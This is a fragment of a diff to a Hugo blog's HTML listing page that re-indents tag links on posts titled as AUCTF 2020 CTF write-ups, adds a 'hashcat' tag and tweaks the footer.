-    <a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -480,16 +414,17 @@ Damn you beat the house: auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}
     <h4><a href="/post/remote-school-auctf2020/">AUCTF 2020 Writeup - Remote School</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -504,32 +439,36 @@ Damn you beat the house: auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}
     <h4><a href="/post/password-cracking-challenges-auctf2020/">AUCTF 2020 Writeup - Password Cracking Challenges</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/hashcat"><kbd class="item-tag">hashcat</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
  
-
     
 
+    
     
 
 </main>
 
         <footer>
-
-            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
-
+            <p class="copyright text-muted">© All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>.</p>
         </footer>
-       
+
+        
+
+        
     </body>
 
 </html>
